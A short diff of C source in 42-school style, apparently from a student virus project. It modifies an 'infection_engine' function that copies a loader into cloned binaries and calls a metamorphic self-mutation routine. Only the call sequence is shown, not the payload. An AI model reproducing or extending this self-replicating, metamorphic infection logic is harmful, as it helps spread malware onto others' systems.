@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 01:53:12 by anselme          ###   ########.fr       */
+/*   Updated: 2020/01/12 17:51:43 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -117,8 +117,9 @@ bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref)
 	|| !not_infected(&original_entry, original_ref)
 	|| !define_shift_amount(&original_entry, &shift_amount)
 	|| !get_client_id(&client_id, original_ref)
-	|| !metamorph_self(son_seed, client_id)
 	|| !copy_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
+	|| !copy_loader_to_clone(clone_ref, original_entry.end_of_last_section)
+	|| !metamorph_self(clone_ref, original_entry.end_of_last_section, son_seed, client_id)
 	|| !adjust_references(clone_ref , shift_amount, original_entry.end_of_last_section)
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, shift_amount)
